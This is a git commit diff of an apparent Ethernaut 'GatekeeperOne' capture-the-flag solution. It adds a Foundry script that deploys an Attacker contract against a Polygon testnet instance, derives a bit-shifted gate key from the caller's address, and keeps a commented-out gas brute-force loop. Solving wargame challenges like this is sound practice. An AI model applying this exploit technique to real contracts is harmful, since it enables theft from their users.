ae199cd0c4a95e637240a3f679104e48a286f6f3
Maurizio Murru <maurizio.murru93@gmail.com>
2023-06-26 10:10:19 +0200

    last gatekeeper 1 commit :D

--- GatekeeperOne/README.md
+++ GatekeeperOne/README.md
@@ -8,4 +8,4 @@ Please set the private key in the `.env` file and you instance address in the fi
 
 ## Running scripts
 
-forge script script/GatekeeperOne.s.sol -f https://polygon-testnet.public.blastapi.io --broadcast
+`forge script script/GatekeeperOne.s.sol -f https://polygon-testnet.public.blastapi.io --broadcast`
--- GatekeeperOne/script/GatekeeperOne.s.sol
+++ GatekeeperOne/script/GatekeeperOne.s.sol
@@ -6,13 +6,33 @@ import "../src/GatekeeperOne.sol";
 import "../src/Attacker.sol";
 
 contract GatekeeperOneScript is Script {
-    
-    address instance = 0x66f2b971DAB1E06B15b97B7f3b70fB87e8ED074e;
-
+    address constant gatekeeperAddress = 0x66f2b971DAB1E06B15b97B7f3b70fB87e8ED074e;
     function run() external {
+        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        Attacker attacker = new Attacker(instance);
-        
+        Attacker attacker = new Attacker(gatekeeperAddress);
+        //Attacker attacker = Attacker(0x03591C9f6F4080834FAB503d4AcA1479ba6A59bE);
+        bytes8 addrKey = bytes8(uint64(uint160(EOA)));
+        addrKey = addrKey << 48;
+        addrKey = addrKey >> 48;
+        addrKey = bytes8(uint64(addrKey) + 2 ** 32);
+        console2.logBytes8(addrKey);
+        //for (uint i = 5962; i < 5963; i++) {
+        //   //try attacker.attack{gas: i + (5 * 8191)}(addrKey) {
+        //    (bool res,) = address(attacker).call{gas: i + (5 * 8191)}(abi.encodeWithSignature("attack(bytes8)", addrKey)); //{
+        //    if (res) {
+        //        console.log("Success");
+        //        console.log(i);
+        //        break;
+        //    }
+        //   // console.log("Success");
+        //   // console.log(i);
+        //   //} catch {
+        //   // //console.log("Fail");
+        //   //}
+        //    
+        //}
+        attacker.attack(addrKey);
         vm.stopBroadcast();
     }
 }
